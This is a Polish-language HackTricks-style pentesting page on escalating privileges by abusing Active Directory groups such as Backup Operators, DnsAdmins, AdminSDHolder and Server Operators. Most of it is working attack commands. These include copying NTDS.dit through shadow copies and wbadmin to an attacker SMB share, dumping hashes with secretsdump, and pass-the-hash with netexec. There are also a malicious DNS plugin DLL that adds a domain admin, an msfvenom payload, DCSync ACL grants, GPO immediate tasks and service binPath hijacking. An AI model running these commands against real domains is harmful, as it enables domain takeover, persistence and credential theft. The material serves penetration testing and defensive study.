# Grupy uprzywilejowane

{{#include ../../banners/hacktricks-training.md}}

## Znane grupy z uprawnieniami administracyjnymi

- **Administrators**
- **Domain Admins**
- **Enterprise Admins**

## Account Operators

Ta grupa ma uprawnienia do tworzenia kont i grup, które nie są administratorami w domenie. Dodatkowo umożliwia lokalne logowanie do Domain Controller (DC).

Aby zidentyfikować członków tej grupy, wykonuje się następujące polecenie:
```bash
Get-NetGroupMember -Identity "Account Operators" -Recurse
```
Dozwolone jest dodawanie nowych użytkowników, jak również lokalne logowanie do DC.

## Grupa AdminSDHolder

Lista Kontroli Dostępu (ACL) grupy AdminSDHolder jest kluczowa, ponieważ ustawia uprawnienia dla wszystkich "protected groups" w Active Directory, w tym grup o wysokich uprawnieniach. Mechanizm ten zapewnia bezpieczeństwo tych grup, zapobiegając nieautoryzowanym modyfikacjom.

Atakujący mógłby to wykorzystać, modyfikując ACL grupy AdminSDHolder i przyznając zwykłemu użytkownikowi pełne uprawnienia. Skutkowałoby to faktycznym nadaniem temu użytkownikowi pełnej kontroli nad wszystkimi grupami chronionymi. Jeśli uprawnienia tego użytkownika zostaną zmienione lub usunięte, zostaną one automatycznie przywrócone w ciągu godziny ze względu na działanie systemu.

Najnowsza dokumentacja Windows Server nadal traktuje kilka wbudowanych grup operatorów jako obiekty chronione (`Account Operators`, `Backup Operators`, `Print Operators`, `Server Operators`, `Domain Admins`, `Enterprise Admins`, `Key Admins`, `Enterprise Key Admins`, itd.). Proces SDProp uruchamiany jest na PDC Emulator co 60 minut domyślnie, ustawia `adminCount=1` i wyłącza dziedziczenie dla obiektów chronionych. Jest to przydatne zarówno do persistence, jak i do wykrywania przeterminowanych uprzywilejowanych użytkowników, którzy zostali usunięci z grupy chronionej, ale nadal zachowują ACL bez dziedziczenia.

Polecenia do przeglądania członków i modyfikowania uprawnień obejmują:
```bash
Get-NetGroupMember -Identity "AdminSDHolder" -Recurse
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'spotless'}
```

```powershell
# Hunt users/groups that still have adminCount=1
Get-ADObject -LDAPFilter '(adminCount=1)' -Properties adminCount,distinguishedName |
Select-Object distinguishedName
```
Skrypt jest dostępny, aby przyspieszyć proces przywracania: [Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1).

Więcej informacji znajdziesz na [ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence).

## AD Recycle Bin

Członkostwo w tej grupie pozwala na odczyt usuniętych obiektów Active Directory, co może ujawnić wrażliwe informacje:
```bash
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```
Jest to przydatne do **odzyskiwania wcześniejszych ścieżek uprawnień**. Usunięte obiekty mogą nadal ujawniać `lastKnownParent`, `memberOf`, `sIDHistory`, `adminCount`, stare SPNs lub DN usuniętej grupy uprzywilejowanej, który później może zostać przywrócony przez innego operatora.
```powershell
Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects `
-Properties samAccountName,lastKnownParent,memberOf,sIDHistory,adminCount,servicePrincipalName |
Select-Object samAccountName,lastKnownParent,adminCount,sIDHistory,servicePrincipalName
```
### Dostęp do kontrolera domeny

Dostęp do plików na DC jest ograniczony, chyba że użytkownik należy do grupy `Server Operators`, co zmienia poziom uprawnień.

### Eskalacja przywilejów

Używając `PsService` lub `sc` ze Sysinternals, można przeglądać i modyfikować uprawnienia usług. Grupa `Server Operators`, na przykład, ma pełną kontrolę nad niektórymi usługami, co pozwala na wykonywanie dowolnych poleceń i eskalację uprawnień:
```cmd
C:\> .\PsService.exe security AppReadiness
```
To polecenie ujawnia, że `Server Operators` mają pełny dostęp, co umożliwia manipulowanie usługami w celu uzyskania podniesionych uprawnień.

## Backup Operators

Członkostwo w grupie `Backup Operators` zapewnia dostęp do systemu plików `DC01` dzięki przywilejom `SeBackup` i `SeRestore`. Te przywileje umożliwiają przechodzenie po folderach, ich listowanie oraz kopiowanie plików, nawet bez jawnych uprawnień, przy użyciu flagi `FILE_FLAG_BACKUP_SEMANTICS`. Do tego procesu konieczne jest użycie odpowiednich skryptów.

Aby wyświetlić członków grupy, wykonaj:
```bash
Get-NetGroupMember -Identity "Backup Operators" -Recurse
```
### Atak lokalny

Aby wykorzystać te uprawnienia lokalnie, wykonuje się następujące kroki:

1. Zaimportuj niezbędne biblioteki:
```bash
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```
2. Włącz i zweryfikuj `SeBackupPrivilege`:
```bash
Set-SeBackupPrivilege
Get-SeBackupPrivilege
```
3. Uzyskaj dostęp i skopiuj pliki z zastrzeżonych katalogów, na przykład:
```bash
dir C:\Users\Administrator\
Copy-FileSeBackupPrivilege C:\Users\Administrator\report.pdf c:\temp\x.pdf -Overwrite
```
### AD Attack

Bezpośredni dostęp do systemu plików kontrolera domeny umożliwia kradzież bazy danych `NTDS.dit`, która zawiera wszystkie hashe NTLM użytkowników i komputerów domeny.

#### Użycie diskshadow.exe

1. Utwórz kopię cieniową dysku `C`:
```cmd
diskshadow.exe
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
begin backup
add volume C: alias cdrive
create
expose %cdrive% F:
end backup
exit
```
2. Skopiuj `NTDS.dit` z shadow copy:
```cmd
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```
Alternatywnie użyj `robocopy` do kopiowania plików:
```cmd
robocopy /B F:\Windows\NTDS .\ntds ntds.dit
```
3. Wyodrębnij `SYSTEM` i `SAM` w celu pobrania hashów:
```cmd
reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV
```
4. Pobierz wszystkie hashes z `NTDS.dit`:
```shell-session
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```
5. Po ekstrakcji: Pass-the-Hash do DA
```bash
# Use the recovered Administrator NT hash to authenticate without the cleartext password
netexec winrm <DC_FQDN> -u Administrator -H <ADMIN_NT_HASH> -x "whoami"

# Or execute via SMB using an exec method
netexec smb <DC_FQDN> -u Administrator -H <ADMIN_NT_HASH> --exec-method smbexec -x cmd
```
#### Użycie wbadmin.exe

1. Skonfiguruj system plików NTFS dla serwera SMB na maszynie atakującej i zapisz poświadczenia SMB w pamięci podręcznej na maszynie docelowej.
2. Użyj `wbadmin.exe` do tworzenia kopii zapasowej systemu i wydobycia `NTDS.dit`:
```cmd
net use X: \\<AttackIP>\sharename /user:smbuser password
echo "Y" | wbadmin start backup -backuptarget:\\<AttackIP>\sharename -include:c:\windows\ntds
wbadmin get versions
echo "Y" | wbadmin start recovery -version:<date-time> -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
```

For a practical demonstration, see [DEMO VIDEO WITH IPPSEC](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610s).

## DnsAdmins

Członkowie grupy **DnsAdmins** mogą wykorzystać swoje uprawnienia do załadowania dowolnej biblioteki DLL z uprawnieniami SYSTEM na serwer DNS, często hostowanym na kontrolerach domeny. Ta możliwość daje duże pole do eksploatacji.

Aby wyświetlić członków grupy DnsAdmins, użyj:
```bash
Get-NetGroupMember -Identity "DnsAdmins" -Recurse
```
### Execute arbitrary DLL (CVE‑2021‑40469)

> [!NOTE]
> Ta luka pozwala na uruchomienie dowolnego kodu z uprawnieniami SYSTEM w usłudze DNS (zwykle na kontrolerach domeny). Problem został naprawiony w 2021 roku.

Członkowie mogą spowodować, że serwer DNS załaduje dowolną bibliotekę DLL (lokalnie lub z udziału zdalnego) używając poleceń takich jak:
```bash
dnscmd [dc.computername] /config /serverlevelplugindll c:\path\to\DNSAdmin-DLL.dll
dnscmd [dc.computername] /config /serverlevelplugindll \\1.2.3.4\share\DNSAdmin-DLL.dll
An attacker could modify the DLL to add a user to the Domain Admins group or execute other commands with SYSTEM privileges. Example DLL modification and msfvenom usage:

# If dnscmd is not installed run from aprivileged PowerShell session:
Install-WindowsFeature -Name RSAT-DNS-Server -IncludeManagementTools
```

```c
// Modify DLL to add user
DWORD WINAPI DnsPluginInitialize(PVOID pDnsAllocateFunction, PVOID pDnsFreeFunction)
{
system("C:\\Windows\\System32\\net.exe user Hacker T0T4llyrAndOm... /add /domain");
system("C:\\Windows\\System32\\net.exe group \"Domain Admins\" Hacker /add /domain");
}
```

```bash
// Generate DLL with msfvenom
msfvenom -p windows/x64/exec cmd='net group "domain admins" <username> /add /domain' -f dll -o adduser.dll
```
Ponowne uruchomienie usługi DNS (co może wymagać dodatkowych uprawnień) jest konieczne, aby DLL został załadowany:
```csharp
sc.exe \\dc01 stop dns
sc.exe \\dc01 start dns
```
Po więcej informacji o tym wektorze ataku, zobacz ired.team.

#### Mimilib.dll

Możliwe jest również użycie mimilib.dll do wykonywania poleceń, modyfikując ją tak, aby uruchamiała konkretne komendy lub reverse shelle. [Check this post](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html) for more information.

### Rekord WPAD dla MitM

DnsAdmins mogą manipulować rekordami DNS, aby przeprowadzać Man-in-the-Middle (MitM) attacks, tworząc rekord WPAD po wyłączeniu global query block list. Do spoofingu i przechwytywania ruchu sieciowego można użyć narzędzi takich jak Responder lub Inveigh.

### Event Log Readers
Członkowie mogą uzyskać dostęp do dzienników zdarzeń, potencjalnie znajdując poufne informacje, takie jak hasła w postaci plaintext lub szczegóły wykonania poleceń:
```bash
# Get members and search logs for sensitive information
Get-NetGroupMember -Identity "Event Log Readers" -Recurse
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'}
```
## Exchange Windows Permissions

Ta grupa może modyfikować DACLs obiektu domeny, potencjalnie przyznając uprawnienia DCSync. Techniki eskalacji uprawnień wykorzystujące tę grupę są szczegółowo opisane w Exchange-AD-Privesc GitHub repo.
```bash
# List members
Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
```
Jeśli możesz działać jako członek tej grupy, klasycznym nadużyciem jest przyznanie kontrolowanemu przez atakującego podmiotowi praw replikacji potrzebnych do [DCSync](dcsync.md):
```bash
Add-DomainObjectAcl -TargetIdentity "DC=testlab,DC=local" -PrincipalIdentity attacker -Rights DCSync
Get-ObjectAcl -DistinguishedName "DC=testlab,DC=local" -ResolveGUIDs | ?{$_.IdentityReference -match 'attacker'}
```
Historycznie **PrivExchange** łączył dostęp do skrzynek pocztowych, wymuszone uwierzytelnianie Exchange oraz LDAP relay, aby osiągnąć tę samą prymitywną możliwość. Nawet jeśli ta ścieżka relay została złagodzona, bezpośrednie członkostwo w `Exchange Windows Permissions` lub kontrola serwera Exchange nadal stanowi wysoko cenioną drogę do uzyskania praw replikacji domeny.

## Administratorzy Hyper-V

Administratorzy Hyper-V mają pełny dostęp do Hyper-V, co można wykorzystać do przejęcia kontroli nad wirtualizowanymi kontrolerami domeny. Obejmuje to klonowanie działających DC oraz wydobywanie skrótów NTLM z pliku NTDS.dit.

### Przykład wykorzystania

Praktyczne nadużycie to zwykle **dostęp offline do dysków/checkpointów DC** raczej niż stare sztuczki LPE na poziomie hosta. Mając dostęp do hosta Hyper-V, operator może utworzyć checkpoint lub wyeksportować zwirtualizowany kontroler domeny, zamontować VHDX i wydobyć `NTDS.dit`, `SYSTEM` oraz inne sekrety bez dotykania LSASS wewnątrz gościa:
```bash
# Host-side enumeration
Get-VM
Get-VHD -VMId <vm-guid>

# After exporting or checkpointing the DC, mount the disk read-only
Mount-VHD -Path 'C:\HyperV\Virtual Hard Disks\DC01.vhdx' -ReadOnly
```
Stamtąd ponownie użyj workflow `Backup Operators`, aby skopiować `Windows\NTDS\ntds.dit` oraz pliki hive rejestru w trybie offline.

## Group Policy Creators Owners

Ta grupa pozwala członkom tworzyć Group Policies w domenie. Jednak jej członkowie nie mogą stosować Group Policies do użytkowników lub grup ani edytować istniejących GPOs.

Ważną niuansą jest to, że **twórca staje się właścicielem nowego GPO** i zwykle uzyskuje wystarczające uprawnienia, by go później edytować. Oznacza to, że ta grupa jest interesująca, gdy możesz albo:

- utworzyć złośliwe GPO i przekonać administratora, żeby powiązał je z docelowym OU/domain
- edytować utworzone przez siebie GPO, które jest już powiązane w przydatnym miejscu
- nadużyć innego delegowanego prawa, które pozwala na linkowanie GPOs, podczas gdy ta grupa daje ci możliwość edycji

Praktyczne nadużycie zazwyczaj oznacza dodanie przez pliki polityk przechowywane w SYSVOL elementu takiego jak **Immediate Task**, **startup script**, **local admin membership** lub zmiana **user rights assignment**.
```bash
# Example with SharpGPOAbuse: add an immediate task that executes as SYSTEM
SharpGPOAbuse.exe --AddImmediateTask --TaskName "HT-Task" --Author TESTLAB\\Administrator --Command "cmd.exe" --Arguments "/c whoami > C:\\Windows\\Temp\\gpo.txt" --GPOName "Security Update"
```
Jeśli edytujesz GPO ręcznie przez `SYSVOL`, pamiętaj, że sama zmiana nie wystarczy: `versionNumber`, `GPT.ini`, a czasem `gPCMachineExtensionNames` także muszą zostać zaktualizowane, inaczej klienci zignorują odświeżenie polityk.

## Organization Management

W środowiskach, gdzie wdrożony jest **Microsoft Exchange**, specjalna grupa znana jako **Organization Management** posiada znaczące uprawnienia. Grupa ta ma przywilej **dostępu do skrzynek pocztowych wszystkich użytkowników domeny** oraz zachowuje **pełną kontrolę nad jednostką organizacyjną (OU) 'Microsoft Exchange Security Groups'**. Ta kontrola obejmuje grupę **`Exchange Windows Permissions`**, którą można wykorzystać do eskalacji uprawnień.

### Eksploatacja uprawnień i polecenia

#### Print Operators

Członkowie grupy **Print Operators** mają przypisane kilka uprawnień, w tym **`SeLoadDriverPrivilege`**, które pozwala im **zalogować się lokalnie do kontrolera domeny**, wyłączyć go oraz zarządzać drukarkami. Aby wykorzystać te uprawnienia, zwłaszcza jeśli **`SeLoadDriverPrivilege`** nie jest widoczne w kontekście bez podwyższeń, konieczne jest obejście User Account Control (UAC).

Aby wypisać członków tej grupy, użyj następującego polecenia PowerShell:
```bash
Get-NetGroupMember -Identity "Print Operators" -Recurse
```
Na kontrolerach domeny ta grupa jest niebezpieczna, ponieważ domyślna polityka kontrolera domeny przyznaje **`SeLoadDriverPrivilege`** grupie `Print Operators`. Jeśli uzyskasz podniesiony token dla członka tej grupy, możesz włączyć to uprawnienie i załadować podpisany, lecz podatny sterownik, aby eskalować do kernel/SYSTEM. Dla szczegółów dotyczących obsługi tokenów sprawdź [Access Tokens](../windows-local-privilege-escalation/access-tokens.md).

#### Użytkownicy pulpitu zdalnego

Członkom tej grupy przyznawany jest dostęp do komputerów za pomocą Remote Desktop Protocol (RDP). Aby wyenumerować tych członków, dostępne są polecenia PowerShell:
```bash
Get-NetGroupMember -Identity "Remote Desktop Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Desktop Users"
```
Dalsze informacje na temat wykorzystywania RDP można znaleźć w dedykowanych zasobach pentesting.

#### Użytkownicy zdalnego zarządzania

Członkowie mogą uzyskiwać dostęp do komputerów za pośrednictwem **Windows Remote Management (WinRM)**. Enumeracja tych członków odbywa się za pomocą:
```bash
Get-NetGroupMember -Identity "Remote Management Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Management Users"
```
W przypadku technik eksploatacji związanych z **WinRM** należy skonsultować się z odpowiednią dokumentacją.

#### Operatorzy serwera

Ta grupa ma uprawnienia do wykonywania różnych konfiguracji na kontrolerach domeny, w tym uprawnienia do tworzenia i przywracania kopii zapasowych, zmiany czasu systemowego oraz wyłączania systemu. Aby wyenumerować członków, podane polecenie to:
```bash
Get-NetGroupMember -Identity "Server Operators" -Recurse
```
Na kontrolerach domeny `Server Operators` zazwyczaj mają wystarczające uprawnienia, aby **ponownie skonfigurować lub uruchamiać/zatrzymywać usługi**, a także uzyskują `SeBackupPrivilege`/`SeRestorePrivilege` w wyniku domyślnej polityki DC. W praktyce czyni to z nich pomost między **service-control abuse** a **NTDS extraction**:
```cmd
sc.exe \\dc01 query
sc.exe \\dc01 qc <service>
.\PsService.exe security <service>
```
Jeśli ACL usługi przyznaje tej grupie prawa do zmiany/uruchamiania, skieruj usługę na dowolne polecenie, uruchom ją jako `LocalSystem`, a następnie przywróć oryginalny `binPath`. Jeśli kontrola usług jest zablokowana, skorzystaj z technik `Backup Operators` opisanych powyżej, aby skopiować `NTDS.dit`.

## References <a href="#references" id="references"></a>

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
- [https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory)
- [https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--](https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--)
- [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
- [http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/](http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/)
- [https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/](https://www.tarlogic.com/en/blog/abusing-seloaddrriverprivilege-for-privilege-escalation/)
- [https://rastamouse.me/2019/01/gpo-abuse-part-1/](https://rastamouse.me/2019/01/gpo-abuse-part-1/)
- [https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13](https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13)
- [https://github.com/tandasat/ExploitCapcom](https://github.com/tandasat/ExploitCapcom)
- [https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp](https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp)
- [https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys)
- [https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e](https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e)
- [https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html](https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html)
- [HTB: Baby — Anonymous LDAP → Password Spray → SeBackupPrivilege → Domain Admin](https://0xdf.gitlab.io/2025/09/19/htb-baby.html)
- [https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-c--protected-accounts-and-groups-in-active-directory](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-c--protected-accounts-and-groups-in-active-directory)
- [https://labs.withsecure.com/tools/sharpgpoabuse](https://labs.withsecure.com/tools/sharpgpoabuse)


{{#include ../../banners/hacktricks-training.md}}
